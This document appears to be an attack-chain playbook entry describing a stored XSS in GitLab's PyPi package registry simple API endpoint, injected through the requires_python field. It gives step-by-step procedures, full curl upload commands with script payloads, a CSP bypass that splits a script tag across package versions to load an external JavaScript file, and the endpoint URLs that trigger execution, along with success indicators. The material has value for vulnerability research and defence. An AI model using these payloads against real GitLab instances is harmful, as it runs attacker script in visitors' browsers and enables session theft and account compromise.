---
id: ac-gitlab-pypi-xss-856836
tags:
  - xss
  - stored-xss
  - gitlab
  - pypi
  - csp-bypass
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-GitLab-Project-for-Package-Upload]]'
  - '[[procedures/Upload-Malicious-PyPi-Package-with-XSS-Payload]]'
  - '[[procedures/Trigger-Stored-XSS-via-Simple-API-Endpoint]]'
  - '[[procedures/Upload-Split-Payload-for-CSP-Bypass]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:32:20.509Z'
description: >-
  Multi-stage attack exploiting a stored XSS vulnerability in GitLab's PyPi
  package registry by injecting malicious payloads into the requires_python
  field, leading to JavaScript execution on the simple API endpoint, with a CSP
  bypass via split payloads across package versions.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored XSS in GitLab PyPi Simple API Endpoint via Unsanitized requires_python Field

Multi-stage attack chain demonstrating exploitation of a stored XSS vulnerability in GitLab's PyPi package simple API endpoint. The attack involves creating a project, uploading a malicious package with an injected payload in the requires_python field, and triggering execution by visiting the endpoint. An advanced variant bypasses CSP by splitting the payload across multiple package versions to load an external script.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Project Setup] --> B[Payload Injection]
    B --> C[Trigger Execution]
    C --> D[CSP Bypass Optional]
    D --> E[JavaScript Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- GitLab instance with PyPi package registry enabled
- Required services/ports: HTTPS (443)
- Network access requirements: Internet access to GitLab API

### Initial Access Requirements

- Valid GitLab personal access token with API and package upload permissions
- No prior access needed beyond authentication

## Detailed Attack Procedures

### Step 1: Project Setup
procedure: [[procedures/Create-GitLab-Project-for-Package-Upload]]

**Objective**: Establish a GitLab project to host the malicious PyPi package, obtaining a project ID for API uploads.

**Instructions**: Create a new project via the GitLab UI or API to get the project ID (e.g., 18315917). This serves as the base for package uploads.

**Expected Output**: Project created with accessible ID.

**Success Indicators**:
- Project ID obtained
- API access confirmed with token

### Step 2: Payload Injection
procedure: [[procedures/Upload-Malicious-PyPi-Package-with-XSS-Payload]]

**Objective**: Upload a PyPi package embedding the XSS payload in the requires_python field to store the injection in the database.

**Instructions**: Prepare a dummy package file (e.g., /tmp/lala.txt) and use [[commands/curl-upload-pypi-xss]] to upload with the payload '"><script>alert(1)</script>'. For CSP bypass, additionally run [[commands/curl-upload-pypi-csp-v1]] and [[commands/curl-upload-pypi-csp-v2]] to split the payload across versions.

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_test_1' -F requires_python='"><script>alert(1)</script>'
```

For bypass:

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_csp_bypass' -F requires_python='"><script src=/vakzz-h1/public/-/raw/a/test.js>'
```

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=2 -F name='package_csp_bypass' -F requires_python=' </script>'
```

**Expected Output**: HTTP 201 response indicating successful upload.

**Success Indicators**:
- Package uploaded without errors
- Payload stored (verifiable via API)

### Step 3: Trigger Execution
procedure: [[procedures/Trigger-Stored-XSS-via-Simple-API-Endpoint]]

**Objective**: Visit the simple API endpoint to render the unsanitized requires_python in HTML, executing the injected JavaScript.

**Instructions**: Navigate to the endpoint URL, e.g., https://gitlab.com/api/v4/projects/18315917/packages/pypi/simple/package_test_1 for basic XSS, or /simple/package_csp_bypass for bypass. The payload breaks out of the data-requires-python attribute and executes.

**Expected Output**: Alert box (basic) or external script load (bypass) on page visit.

**Success Indicators**:
- JavaScript alert fires
- For bypass, network request to external JS file observed

## Attack Chain Summary

### Key Achievements

1. Stored malicious payload in GitLab's PyPi registry via API upload
2. Achieved arbitrary JS execution on endpoint visitors despite 50-char limit
3. Bypassed CSP by concatenating split payloads across package versions

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
